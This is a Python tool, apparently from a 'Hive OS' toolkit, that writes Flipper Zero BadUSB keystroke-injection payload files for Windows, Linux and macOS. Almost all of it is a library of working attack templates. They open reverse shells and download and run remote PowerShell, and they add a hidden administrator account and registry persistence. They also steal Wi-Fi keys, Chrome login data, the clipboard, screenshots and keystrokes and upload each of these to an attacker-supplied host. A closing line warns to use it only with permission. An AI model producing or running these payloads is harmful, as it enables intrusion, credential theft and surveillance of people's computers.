#!/usr/bin/env python3
"""
HIVE OS — Flipper Zero BadUSB Tool
Generate .badusb / .txt payload files for Flipper Zero.

Supports:
  - windows : Windows payloads (PowerShell, CMD, Run dialog)
  - linux   : Linux payloads (bash, xterm)
  - macos   : macOS payloads (AppleScript, Terminal)
  - android : ADB / Termux payloads
  - generic : Cross-platform

Usage:
  flipper_badusb.py --os windows --payload reverse_shell --lhost 192.168.1.100 --lport 4444 --file rs.txt
  flipper_badusb.py --os windows --payload wifi_grab --file wifi.txt
  flipper_badusb.py --list-payloads
"""

import sys
import argparse
from pathlib import Path

# ── Payload Templates ──────────────────────────────────────
PAYLOADS = {
    "reverse_shell": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')"
''',
        "linux": '''DELAY 1000
CTRL ALT t
DELAY 500
STRINGLN bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
''',
        "macos": '''DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 500
STRINGLN bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
''',
    },
    
    "wifi_grab": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN cmd /c "netsh wlan export profile key=clear && powershell -c IEX(New-Object Net.WebClient).UploadString('http://{lhost}:{lport}/grab',(Get-Content *.xml -Raw))"
''',
        "linux": '''DELAY 1000
CTRL ALT t
DELAY 500
STRINGLN for f in /etc/NetworkManager/system-connections/*; do echo "=== $f ==="; cat "$f"; done | curl -d @- http://{lhost}:{lport}/grab
''',
    },
    
    "screenshot_exfil": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -c "Add-Type -Assembly System.Windows.Forms; $g=[System.Drawing.Graphics]::FromImage($b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)); $g.CopyFromScreen((0,0),(0,0),$b.Size); $b.Save('ss.png'); [Net.WebClient]::new().UploadFile('http://{lhost}:{lport}/ss','ss.png')"
''',
        "macos": '''DELAY 1000
GUI SPACE
DELAY 200
STRING screencapture -x ss.png
ENTER
DELAY 1000
STRINGLN curl -F file=@ss.png http://{lhost}:{lport}/ss
''',
    },
    
    "rickroll": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('https://www.youtube.com/watch?v=dQw4w9WgXcQ',1);close()"
''',
        "linux": '''DELAY 1000
CTRL ALT t
DELAY 500
STRINGLN xdg-open https://www.youtube.com/watch?v=dQw4w9WgXcQ
''',
        "macos": '''DELAY 1000
GUI SPACE
DELAY 200
STRING open https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
''',
    },
    
    "add_admin_user": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN cmd /c "net user {username} {password} /add && net localgroup administrators {username} /add"
''',
    },
    
    "persistence_registry": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -c "New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name {name} -Value 'powershell -w hidden -c IEX(irm http://{lhost}:{lport}/persistence)' -Force"
''',
    },
    
    "browser_passwords": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -c "(Get-ChildItem $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data -ErrorAction SilentlyContinue | %{ $_.FullName }) -join '' | Out-File $env:TEMP\\bp.txt; [Net.WebClient]::new().UploadFile('http://{lhost}:{lport}/bp',(Get-Item $env:TEMP\\bp.txt).FullName)"
''',
    },
    
    "keylogger_start": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -w hidden -c "while(1){$t=(Get-Date -Format 'yyyyMMdd_HHmmss');$k='';while($k.Length -lt 500){$c=[console]::ReadKey($true);$k+=$c.KeyChar}; [Net.WebClient]::new().UploadString('http://{lhost}:{lport}/kl',\"`$env:COMPUTERNAME|`$t|`$k\")}"
''',
    },
    
    "network_info": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN cmd /c "ipconfig /all > %TEMP%\\ni.txt && systeminfo >> %TEMP%\\ni.txt && [Net.WebClient]::new().UploadFile('http://{lhost}:{lport}/ni','%TEMP%\\ni.txt')"
''',
        "linux": '''DELAY 1000
CTRL ALT t
DELAY 500
STRINGLN (ifconfig; cat /etc/os-release; uname -a; whoami; id) | curl -d @- http://{lhost}:{lport}/ni
''',
    },
    
    "clipboard_steal": {
        "windows": '''DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -c "Add-Type -Assembly PresentationCore; [Windows.Forms.Clipboard]::GetText() | Out-File $env:TEMP\\cb.txt; [Net.WebClient]::new().UploadFile('http://{lhost}:{lport}/cb','$env:TEMP\\cb.txt')"
''',
    },
}

def generate_payload(payload_type, os_type, **kwargs):
    """Generate BadUSB payload string."""
    if payload_type not in PAYLOADS:
        raise ValueError(f"Unknown payload: {payload_type}. Use --list-payloads")
    
    payload_data = PAYLOADS[payload_type]
    if os_type not in payload_data:
        raise ValueError(f"Payload '{payload_type}' not available for {os_type}")
    
    template = payload_data[os_type]
    return template.format(**kwargs)

def write_payload(content, filename, os_type):
    """Write Flipper BadUSB file."""
    header = f"REM Hive OS BadUSB Payload\nREM OS: {os_type}\nREM Generated: {__import__('datetime').datetime.now().isoformat()}\n\n"
    
    full_content = header + content
    
    with open(filename, 'w') as f:
        f.write(full_content)
    
    return full_content

def main():
    parser = argparse.ArgumentParser(description='Hive OS Flipper BadUSB Tool')
    parser.add_argument('--os', choices=['windows', 'linux', 'macos', 'android'], default='windows')
    parser.add_argument('--payload', default='reverse_shell')
    parser.add_argument('--lhost', default='192.168.1.100')
    parser.add_argument('--lport', type=int, default=4444)
    parser.add_argument('--username', default='hiveops')
    parser.add_argument('--password', default='HiveOps2024!')
    parser.add_argument('--name', default='hive_persist')
    parser.add_argument('--file', required=True)
    parser.add_argument('--list-payloads', action='store_true')
    
    args = parser.parse_args()
    
    if args.list_payloads:
        print("\n🎭 BadUSB Payload Database\n")
        for name, oses in PAYLOADS.items():
            print(f"  {name}:")
            for os_name in oses.keys():
                print(f"    • {os_name}")
        print()
        return
    
    try:
        content = generate_payload(
            args.payload, args.os,
            lhost=args.lhost, lport=args.lport,
            username=args.username, password=args.password,
            name=args.name
        )
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)
    
    full = write_payload(content, args.file, args.os)
    
    print(f"\n✅ Generated BadUSB payload: {args.file}")
    print(f"  OS:      {args.os}")
    print(f"  Type:    {args.payload}")
    print(f"  Size:    {len(full)} bytes")
    print(f"  Lines:   {len(full.splitlines())}")
    print(f"\nTransfer to Flipper: /ext/badusb/{Path(args.file).name}")
    print(f"\n⚠️  WARNING: Only use on systems you own or have permission to test.")
    print()

if __name__ == '__main__':
    main()
